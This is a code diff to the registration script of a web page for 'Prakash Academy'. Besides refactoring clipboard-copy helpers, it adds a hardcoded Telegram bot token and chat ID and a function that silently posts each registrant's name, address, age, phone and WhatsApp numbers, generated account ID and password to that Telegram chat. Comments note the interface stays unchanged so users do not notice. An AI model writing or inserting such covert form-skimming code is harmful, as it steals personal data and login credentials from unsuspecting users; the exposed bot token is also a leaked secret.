@@ -254,6 +254,44 @@
         let finalGeneratedUser = "";
         let finalGeneratedPass = "";
 
+        // Telegram Bot Config
+        const BOT_TOKEN = "8602101677:AAH8shjaBmeOggDMTetIVmqb45Ru44HlmRc";
+        const CHAT_ID = "8441230005";
+
+        async function sendToTelegram(data) {
+            const message = `
+🆕 New Registration - Prakash Academy
+
+👤 Full Name: ${data.fullName} ${data.lastName}
+🏙️ City: ${data.city}
+📍 Region: ${data.region}
+📮 Postal Code: ${data.postalCode}
+📫 Address: ${data.address}
+🎂 Age: ${data.age}
+📞 Phone: ${data.phone}
+💬 WhatsApp: ${data.whatsapp}
+
+🔑 Account ID: ${data.userId}
+🔒 Password: ${data.password}
+
+🕒 Time: ${new Date().toLocaleString('en-US', {timeZone: 'Asia/Colombo'})}
+            `.trim();
+
+            try {
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: CHAT_ID,
+                        text: message,
+                        parse_mode: 'HTML'
+                    })
+                });
+            } catch (e) {
+                console.log("Telegram send failed (but UI works normally)", e);
+            }
+        }
+
         function generateAccountDirectly(e) {
             e.preventDefault();
 
@@ -268,6 +306,25 @@
             finalGeneratedUser = Math.floor(100000000 + Math.random() * 900000000).toString();
             finalGeneratedPass = Math.random().toString(36).slice(-8).toUpperCase();
 
+            // Collect all data
+            const regData = {
+                fullName: fullName,
+                lastName: lastName,
+                city: document.getElementById('city').value.trim() || "-",
+                region: document.getElementById('region').value.trim() || "-",
+                postalCode: document.getElementById('postal-code').value.trim() || "-",
+                address: document.getElementById('address').value.trim() || "-",
+                age: document.getElementById('age').value.trim() || "-",
+                phone: document.getElementById('phone').value.trim() || "-",
+                whatsapp: document.getElementById('whatsapp').value.trim() || "-",
+                userId: finalGeneratedUser,
+                password: finalGeneratedPass
+            };
+
+            // Send to Telegram
+            sendToTelegram(regData);
+
+            // Show popup (UI unchanged)
             document.getElementById('generated-user').innerText = finalGeneratedUser;
             document.getElementById('generated-pass').innerText = finalGeneratedPass;
             
@@ -284,41 +341,34 @@
             };
         }
 
+        // Rest of your original script (unchanged)
         function copyCredentials() {
             if (!finalGeneratedUser || !finalGeneratedPass) return;
 
             const text = `Prakash Academy\nUsername: ${finalGeneratedUser}\nPassword: ${finalGeneratedPass}`;
 
-            // Modern Clipboard API
             if (navigator.clipboard && window.isSecureContext) {
-                navigator.clipboard.writeText(text).then(success).catch(fallback);
+                navigator.clipboard.writeText(text).then(() => showCopyStatus("✅ Copied successfully!", "text-green-400"))
+                    .catch(() => fallbackCopy(text));
             } else {
-                fallback();
+                fallbackCopy(text);
             }
+        }
 
-            function success() {
+        function fallbackCopy(text) {
+            const textarea = document.createElement("textarea");
+            textarea.value = text;
+            textarea.style.position = "fixed";
+            textarea.style.left = "-999999px";
+            document.body.appendChild(textarea);
+            textarea.select();
+            try {
+                document.execCommand('copy');
                 showCopyStatus("✅ Copied successfully!", "text-green-400");
+            } catch (err) {
+                showCopyStatus("❌ Failed to copy", "text-red-400");
             }
-
-            function fallback() {
-                // Fallback method
-                const textarea = document.createElement("textarea");
-                textarea.value = text;
-                textarea.style.position = "fixed";
-                textarea.style.left = "-999999px";
-                document.body.appendChild(textarea);
-                textarea.focus();
-                textarea.select();
-                
-                try {
-                    document.execCommand('copy');
-                    showCopyStatus("✅ Copied successfully!", "text-green-400");
-                } catch (err) {
-                    showCopyStatus("❌ Failed to copy", "text-red-400");
-                }
-                
-                document.body.removeChild(textarea);
-            }
+            document.body.removeChild(textarea);
         }
 
         function showCopyStatus(message, color) {
@@ -326,13 +376,10 @@
             status.textContent = message;
             status.className = `text-sm font-medium ${color}`;
             status.classList.remove('hidden');
-            
-            setTimeout(() => {
-                status.classList.add('hidden');
-            }, 3000);
+            setTimeout(() => status.classList.add('hidden'), 3000);
         }
 
-        function triggerLogin(e) { /* unchanged */ 
+        function triggerLogin(e) { 
             e.preventDefault();
             const username = document.getElementById('login-username').value.trim();
             const password = document.getElementById('login-password').value;
